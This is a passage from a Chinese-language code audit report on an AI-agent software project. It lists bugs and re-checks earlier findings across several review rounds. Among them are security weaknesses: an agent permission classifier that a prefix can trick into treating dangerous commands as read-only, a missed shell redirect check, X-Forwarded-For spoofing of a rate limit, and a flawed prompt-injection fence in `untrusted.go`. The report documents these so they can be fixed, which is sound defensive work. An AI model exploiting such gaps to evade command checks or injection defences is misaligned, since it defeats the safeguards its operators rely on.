trustdomain：签名材料 uint16 长度前缀可回绕；genesis 非 admin 签发者可计入创世 quorum；每 UDP 包克隆全量 State（洪泛放大）。calendar：`UNTIL=...Z` 解析失败 → 永久重复；WEEKLY interval>1 跨年错乱；重复事件在 list/freebusy 中不可见（ExpandRecurring 无人调用）；`genID` 同 tick 碰撞。netdev/transport：`ExecInput` 取消后 goroutine+VTY 永久滞留；双 `Start` double-close panic；`ssh -G` 瞬时失败永久负缓存；extra_read 前缀可把危险命令重分类为 Read。installsource：`copyDir` 符号链接被静默跳过；`InstalledSkillNames` 忽略项目作用域；`stableMarshalManifest` 死代码且 schema 不一致。desktop：`ppt_template_vision.go:109` 唯一无超时 VLM 调用；`dotenv.go:246` 非原子写 `~/.env`；`window_state.go` 拔显示器后窗口恢复到屏外；`notify_long.go:44` 提醒按钮硬编码"知道了"；crash 脱敏只覆盖 C:\Users|/home|/Users。Python：`browseruse_server.py` 取消竞态/SSE 断连不取消/`_run_lock` 死锁 → 全部 /run 409 直到重启；`hyper_extract_server.py` 单线程 HTTPServer；`ocr_pdf.py` 句柄未关每页泄漏 PNG。脚本：`scripts/backfill-issue-labels.mjs` 向 OpenAI 端点发不存在的 qwen 模型名 404；`scripts/desktop-build.sh` 引用已删除的 workflow 且命名会与 installer 冲突。前端尾部：HistoryPanel 范围过滤器恒返回 "project"（空操作）+ 硬编码"办公/编码"徽章；`WorkspacePanel` 英文月份名；`CustomSelect` 无键盘支持+中文默认值；`AuditProjectPanel` 全部用 `<span role="button">` 无键盘可达性；`ExpertPanel` ~70 行永不渲染的订阅状态每轮白算。

### 10.4 第 4 轮新增不完整特性

1. MCP 管理器"连接模式"界面无渲染器（功能无头，R4-1）。
2. `internal/cli/acp.go` 的 `acpBuiltinTools` 等仅被测试引用——生产路径用 boot.Build（遗忘的迁移残留）。
3. `/output-style` 只能列表不能应用（要手改配置）。
4. Windows ssh-agent `dialAgent` stub（agent 认证在 Windows 不可用）。
5. ClawHub 市场装不了（R4-5）；`stableMarshalManifest` 死代码。
6. Windows 自更新三套实现互相矛盾（R4-6）；`scripts/desktop-build.sh` 成孤儿。
7. Linux 截图热键永不触发 / macOS 只认修饰键（E-stop 依旧 Windows-only——桌面控制无跨平台急停）。
8. `fairpeer://` 深链接仅 Windows 实现。
9. cua-replay `-base`/模型解析文档有、实现无。
10. 前端：ShortcutsCheatsheet 仍是无快捷键清单的空壳；CoworkDock 拖拽导入纯视觉；社区检测按钮被注释掉；HistoryPanel scope 过滤器空操作；`settings.pageDesc.cowork/netdev` 两个 key 从未写（其余 14 个页签都有描述行）。

---

## 11. 第 5 轮补充发现（关键路径重推导）

### 11.1 新增 P1（3 项）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
| R5-1 | `internal/tool/builtin/edit_fuzzy.go:342-378` | `blockAnchorMatch` 当 old 的**中间行全为空白**时 `middleOld` 为空，`:362` 的 `len(middleOld)==0 ||` 短路 → 首/尾锚定行之间的**任意跨度**都算匹配且 matches==1 | `old = "func f() {\n\n}"` 对 5000 行函数 → 整个函数体被静默替换删除（editfile.go:96 的逐字守卫放行，因为区域确实是 old 的逐字扩展）。**数据损毁级** | 中间空白时要求有界间隙/尺寸合理性检查 |
| R5-2 | `internal/netdev/proposal_steps.go:463-472,507-535` | `absentMarker="\x00absent"` 与 `s.Backup` 的 `\x00` join 分隔符共用字节；证书**原本不存在**时 Backup=`"\x00absent\x00<key>"`，`SplitN("\x00",2)` 得 certBak=`""`（≠absentMarker）→ 回滚上传**空证书**，keyBak=`"absent\x00<key>"`（损坏串） | 证书变更回滚摧毁设备上正常工作的密钥对 | 换用不含 \x00 冲突的编码（长度前缀或 JSON），补 absent 双向单测 |
| R5-3 | `internal/netdev/proposal.go:229-234` | `proposalSeq` 只在内存；同日重启重新生成 `P20260905-1…`，`SaveProposal`（os.WriteFile）静默**覆盖既有提案文件** | 重启即丢审计记录（netdev 变更审计的唯一写路径） | 序列号持久化或 ID 加随机后缀；SaveProposal 改原子写 + 存在即拒绝 |

### 11.2 新增 P2（12 项）

- `agent.go:1281,1448` `stream()`/`systemPrompt()` 无锁读 `session.Messages`，与游离的 /compact Replace 竞争；compaction 快照与 Replace 之间新写入的消息被**静默丢弃**（A-1）。
- `agent.go:1378` `*chunk.ToolCall` 无 nil 解引用（malformed chunk → panic，A-2）。
- `compact.go:732` 归档文件名毫秒时间戳，同毫秒两次压缩互相覆盖（A-4）。
- `plugin/transport_stdio.go:604` `notify()` 绕过 `callMu` 写同一 stdin 管道 → JSON-RPC 帧交错损坏（A-9）。
- `config.go:1723-1730` 用户/项目两层 `[[providers]]` 按**数组索引**字段合并——项目文件的 base_url/api_key_env/name 覆写用户第一家 provider（plugins 有按名合并，providers 没有，A-14）。
- `config.go:1719→1985` Load 即写盘（迁移重写用户与项目 TOML），并发启动竞争；且 `controller.go:730` **每回合**全量 `config.Load()`（A-15/A-22）。
- `render.go:801` `renderStringMap` 不给 key 加引号 → 键含空格/点即产出非法 TOML，下次 Load 直接坏（A-16）。
- `scheduler.go:755` G4-1 高频确认是**空 if 体**——5-48 次/天任务无确认创建，与紧邻注释矛盾（A-17）。
- `expr.go:301` `every …` 解析失败返回 0 → NextRun==now 无限即发热循环烧 token（A-18）。
- `scheduler.go:327` Load 在锁外持久化 `s.tasks`（A-19）。
- `expr.go:519` cron 垃圾字段静默接受（`mon` → dow=0 → 周日触发）（A-20）。
- `control/controller.go:2103` `Rewind` 无 Session 锁截断 `s.Messages`（与 /compact 竞争，A-21）。

### 11.3 第 5 轮新增 P3 / 不完整特性

`hasShellWriteRedirect` 漏 `2>file`（A-3）；storm-breaker 只进会话不进事件流（模型/显示分叉，A-5）；`browserExtract` 中文页截断出非法 UTF-8（A-10）；`preExecOnlineCheck` 把 who 表头当 1 个会话反复阻断执行（A-13，保守向）；netdev `browser.go:3243` dialog handler 绑定在会话起始 ctx——切页签后自动放行服务的是**被弃页签**，新页签对话框再次阻塞浏览器（A-7 关联项）。

---

## 12. 结论复核记录（第 5 轮 Part B）

对前 4 轮全部 48 项 P0/P1 结论逐条回到源码独立复核：**46 项 CONFIRMED、0 项 REFUTED、2 项 ADJUSTED**（#8 回退/快照非确定性：正确文件是 `control/controller.go:2104`，原报告路径笔误，实质成立；#17 步内部分回滚：精确行为为 `:642-657` 的 `Applied=false` 语义，实质成立）。另有两处结论精化：

1. `untrusted.go` 围栏偏移错位（T2/P1）：第 5 轮实测确认**输出损坏**成立，但"完整逃逸围栏"需要 rune 收缩量恰好凑齐，实际更可能是**中性化错位导致的上下文污染**而非干净的注入原语——严重级维持 P1（这是唯一注入防线，错位本身就是缺陷），攻击表述按上文口径理解。
2. `apply_patch.go` Update+Move 同路径（T6/P1）：精确语义是"先到的前序 Update 写入被后续 Move 的 `os.Remove(源路径)` 销毁"，非"目标文件被删后报成功"——仍是数据丢失，维持 P1。

此复核使本报告的 P0/P1 全部结论均经过两轮独立推导，可信度满足修复排期依据。

---

## 13. 第 6 轮：Spec 自身复核（误报排查）

对前 5 轮结论中此前未二次验证的 **121 条**（24 条 P1 + 97 条 P2/横切）再做一轮"证伪导向"复核：复核者被明确要求主动寻找上游校验、初始化顺序、调用方守卫、框架语义等**推翻**结论的证据。结果：**99 条确认 / 2 条证伪 / 20 条修正表述**。仓库级事实（6 个被 git 追踪的 .exe、无 Makefile、版本徽章分歧、CHANGELOG 重复合并、go 1.26 指令）经命令行独立核实全部属实。

### 13.1 证伪（真误报，2 条）

| 原结论 | 证伪依据 | 修正后的事实 |
|---|---|---|
| `auditanchor.go:85` 审计锁内做网络 RPC，慢 peer 拖慢一切操作（§2.3 P2） | `AnchorAudit → Node.Propose`（node.go:273-308）是**纯本地操作**：构建区块、签名、内存追加、本地落盘；只有 quorum 路径（ProposeQuorum :426+）才联系 peer | 成立的部分仅剩：锚定在 auditMu 内做有界的本地签名/哈希/磁盘工作（每 16 条或 10 分钟一次，代码注释自知）。**无网络阻塞风险**。原文已划线更正 |
| R4-1 cli MCP"连接模式"界面无渲染器，用户按键操作不可见选择器（§10.1 P1） | render 分支缺口属实，但 `mcpActionMode` **从未被任何菜单 action 列表追加**（grep 全部 appendMCP* 函数），该 stage 用户不可达 | 降级 P3 死代码地雷：仅当将来有人把"连接模式"接进菜单才会触发。原文已更正 |

### 13.2 修正表述（20 条，实质均部分成立，严重级或机制描述需收窄）

| 原结论 | 修正 |
|---|---|
| §2.1 A6：Close 的 WaitGroup Add/Wait 竞争 | **该机制不成立**——所有 `wg.Add(1)` 都在 spawn 前同步发生，follow-up drain 在 turn-1 goroutine 的 defer 之前执行，计数不会归零。成立的部分：Close 等待仅 5 秒即放弃，turn/dream 可在 cleanup 后存活；以及空闲 dream 定时器路径存在残余的零计数 Add 竞争（idleDreamFired 先解除定时器再 spawn）。修复方向不变（closed 标志门控） |
| §2.2 T3：screenshot 无钳制 → 必然 fatal OOM | 病理尺寸会先在 `CreateCompatibleBitmap` 失败返回；溢出 panic 会被回合级 recover 接住。现实最坏情况是**多 GB 瞬时分配 + 逐像素慢循环**（仍可拖垮机器，但非必然崩溃）。无钳制本身属实，仅免审批（ReadOnly）属实 |
| §2.3 N12：幻影 running 永久阻塞 resume | 机制属实（错误出口落盘 running 状态、DiscoverResume 拒绝、看板 flag 卡死）；但**可恢复**——DiscoverLayer 无"已有 running"闸门，新扫描会覆写单槽存储。改为"永久不可 resume 的错误记录 + 卡死看板标志" |
| §2.4 C7：多行 description 导致 skill 从索引消失 | 解析后 `description` 的值是字面量 `">"`（**非空**）→ skill 仍进索引，但描述是一个垃圾字符"">""——比消失更糟的另一种坏法。多行正文静默丢失属实。原文已更正 |
| §2.6 B6：XFF 伪造绕过 IP 限速 | 代码事实全对（取最左 XFF、`172.` 前缀信任整个 172/8、限速按此 IP 键控）；但**随附 docker-compose 用 Caddy ≥2.5 会整体替换（而非追加）XFF**，官方部署下伪造路径不成立。定性为"暴露直连或前置旧代理时的潜在加固缺陷" |
| §2.8 F3：LogPanel unmount 不停 follow | 属实，但流有 MaxSeconds/MaxLines/MaxBytes 上限且单设备单槽——**自会终止**，非无限泄漏 |
| §3 boot 全局重写：vlm 模型串无锁 | `SetVLMModel`/`SetVoiceModel` 已有 `vlmMu/sttMu` 保护——从清单中移除；其余 4 个全局（postEditHook/browserLaunch/browserAutoRT/providerChatRunner）竞争属实 |
| §3 rag HE 富集"关店竞写" | 全仓库**无任何 ragStore.Close 调用**——不存在关店竞争；真实危害是 heService.Stop 在 wave 中途杀掉 sidecar + 进程退出丢弃在飞 upsert。无取消/无重入属实 |
| §3 he_service monitor 裸读 s.cmd | 读法属实，但 Start 的启动先行建立 happens-before；真 bug 是**陈旧 monitor 的 `s.running=false` 晚于新 Start 置 true 落地** → IsRunning 误报 false、后续 Start 因端口探测失败；"monitor 堆叠"言过其实 |
| §2.4 C-日历（round2）`calendar.go:356 e.ID[:12]` panic | 现网不可达——所有 ID 都由 `genID()` 生成（`evt_<UnixNano>`，≥23 字符）。仅为潜在健壮性缺陷 |
| §10.2 mobilebridge FileEnd "句柄泄漏" | fdFiles 最多持一个句柄，且下一次 FileStart 会关闭并清空全部——自愈延迟关闭，非永久泄漏。**无总量上限的写入**部分属实（50MB 校验形同虚设） |
| §10.3 netdev/transport 双 Start double-close panic | 机制属实，但现有 4 个调用点全部 New→Start 一次→错误即 Close——**无活路径触发**，属 API 潜在隐患 |
| §10.1 R4-8 前端 skill_hooks"重扫描后切换失败" | 早退丢失后续修改属实（且连 SaveTo 一起跳过）；但 AllSkills 底层 store 每次调用重走磁盘，**声称的触发条件基本不成立**（需 boot 后根配置变更才分叉）——严重级下调 |
| §11.2 A-2：`*chunk.ToolCall` 无 nil 解引用 | 不对称属实，但现有仅有的两个生产 emitter（openai/anthropic）都保证非 nil——**当前不可达** |
| §11.2 A-4：归档毫秒时间戳同毫秒互覆 | 命名属实，但压缩调用方全部串行且每次耗时秒级——同毫秒碰撞实际不可达 |
| §11.2 A-9：notify() 绕过 callMu 写管道 | 无锁属实，但唯一的 notify 调用（notifications/initialized）在初始化序列中串行发生——**当前无并发调用方**，属未来隐患 |
| §11.2 A-15：Load 每次都写盘 + 每回合 Load | 每回合 `config.Load()` 属实（每回合磁盘 I/O 成立）；但**写盘副作用仅在发现遗留 `tier =` 行时发生**（每个遗留文件一次），非每次加载 |
| §11.3 who 表头被当会话"反复阻断" | 原因修正：GNU who 本无表头，误报来自**检查自身的 PTY SSH 会话**被 sshd 记入 utmp——空闲 Linux 机器报"1 个会话"并首次阻断；Note 记录稳定计数后第二次点击即放行，"反复阻断"言过其实 |
| §2.6 B-改进：feishu 空 token 放行 | `verificationTokenValid` 的空 token 放行分支**在 webhook 模式不可达**（Start 无 token 拒绝启动）；`==` 非常量时间比较、无重放校验、绑定全部接口均属实 |
| §6 CHANGELOG 重复 header 行号 | :1133/:1150 → 实为 :1147/:1164（已更正正文） |

### 13.3 复核后修订的整体统计

| 严重级 | 复核前 | 复核后 |
|---|---|---|
| P0 | 4 | **4**（全部维持） |
| P1 | ~60 | **~59**（R4-1 降级 P3；其余 P1 全部经二次推导维持，2 处仅精化机制描述） |
| P2 | ~120 | **~118**（auditanchor 网络阻塞证伪移除；calendar ID、FileEnd 句柄等 3-4 条降为潜在隐患） |
| P3 | ~130 | **~133**（含降级项） |

**结论**：本报告的骨架结论（P0 全部、P1 绝大多数、P2 主体）经证伪导向复核后全部站得住；被推翻的 2 条均已按上表在正文划线更正，20 条表述收窄已逐条标注。未复核的残留：约 90 条 P3 逐条复核投入产出比低（多为死代码/文案类，修复动作本身无风险），列为"抽样可信"。

---

## 14. 第 7 轮：死代码清单 / 文档漂移 / P3 行为类 专项复核

针对第 6 轮未覆盖的三块残余：**死代码与未接线清单 38 条**（驱动"删除/接线"建议，错删代价高）、**文档漂移与计数声明 20 条**、**P3 行为类 + 遗漏 P2 单行条目 40 条**。另外，第 6 轮的 2 条证伪经主审计者亲自复读源码再次确认成立（`AnchorAudit → Propose` node.go:273 确为纯本地 build→Append→commitPersist 路径；`mcpActionMode` 确实从未被任何 action 列表 append）。

结果：**82 条确认 / 3 条推翻 / 12 条修正表述**（含路径勘误）。

### 14.1 推翻（3 条，正文已划线更正）

| 原结论 | 证伪依据 | 后果 |
|---|---|---|
| `runtime/uv_install.go` Install 无调用方、自动下载未接线（§4 死代码清单） | boot.go:1015-1024：`ResolveUV` 失败时 `go runtimepkg.Install(bgCtx)` ——**自动下载已接线** | 若按原清单删除该文件会破坏启动编译。仍成立：sha256Hex 死函数、下载后不做 SHA256 校验的供应链缺口 |
| `compact.go` SummarizeFrom/SummarizeUpTo/CompactNow 无调用方（§4） | 完整生产链：Controller.SummarizeFrom/UpTo ← CLI rewind.go:129 / serve.go:655 / remotehost host.go:938 / desktop remote_session.go:549；CompactNow ← Controller.Compact | 若删除会坏掉 CLI 回退摘要、HTTP serve、远程主机、桌面远程会话四个功能 |
| netdev `isProjectFile` 死代码（§4） | auditproject.go:124 生产调用 | 从死代码清单移除 |

### 14.2 修正表述（择要，全部属实但需收窄）

- "三篇文档教 make" → 实为两篇（README_cn:133、CONTRIBUTING:92-97）；SPEC.md 不含 make 引用。
- skill 市场"零代码" → **部分实现**：`skill_market` 工具（browse/search/install）已存在并接线；缺 publish/update、registry API、签名、CLI。
- 二进制名漂移方向反了：wails.json 输出名是 `fairpeer`，而**发布管线期望 `fairpeer-desktop`**（desktop-build.sh:29/96、nfpm.yaml、updater.go:269）——README 与产物名一致，真正的矛盾是 wails.json vs 发布脚本（按 stock wails.json 走 release 脚本会找不到产物）。
- CLI usage 文本：不是"宣传不存在的命令"，而是反向——**5 个真实子命令（code/init/host/codegraph/review）未出现在 help**。
- `max_runs_per_day`：48 上限确实强制（scheduler.go:759-761），但 `[scheduler]` 配置表**根本不存在**——错误提示引用了一个无法设置的 config key（与 S5 的 cron 绕过互为表里）。
- PowerShell `&&` 守卫（bash.go:231）：机制属实但守卫**仅是提示性**的，且 PS 5.1 下未加引号的 `&&` 本身就是语法错误——实际不会执行链式命令，降为文案噪音。
- `discover.go:125` /0：32 位平台是**静默得 0 击穿上限**（比溢出更糟），非溢出 panic。
- crash 脱敏：任意盘符的 `\Users\` 都会被清洗（含 D:），漏的是非 Users 根（D:\Profiles\、/root/、/srv/）。

### 14.3 复核中的新发现（比原报告更糟或原漏报）

1. **App.tsx:1249 硬编码 validTabs 是 SETTINGS_TABS 的过期副本——缺 "trustdomain"**：请求打开信任域设置页会静默回落到 general 页。
2. LINKPEER M0-M3 "已完成"标记经逐项核实**准确**（加密/重键/STUN/桌面接线均在）——维持 §6 积极面结论。
3. NETDEV_USAGE "十二件套"之外，另有 fanout/locate/nmap/netprobe/cvematch/triage/docker/kube/firewall/dbquery/backup/logread/logsearch 共 14 个注册工具未进该文档清单。

### 14.4 第 7 轮后累计复核状态

| 类别 | 已二次验证 | 确认 | 推翻 | 收窄 |
|---|---|---|---|---|
| P0（4 项） | 4/4（含三次独立确认） | 4 | 0 | 0 |
| P1 | 全部 | 59−1 降级 | 1 降级（mcpStageMode 不可达） | 4 处机制精化 |
| P2 | 全部 | 118−1 | 1（auditanchor） | ~20 |
| P3/死代码/文档 | 死代码 38、文档 20、行为类 40 | 82 | 3（uv Install / Summarize 系列 / isProjectFile） | 12 |

**净结论**：七轮之后，全部 P0/P1/P2 均经至少两轮独立验证；死代码清单经 grep 逐条复核后仅 3 处误标（均已在正文划线，防止误删）。剩余未逐条复核的仅剩纯文案/样式类 P3 尾部，不影响任何修复决策。
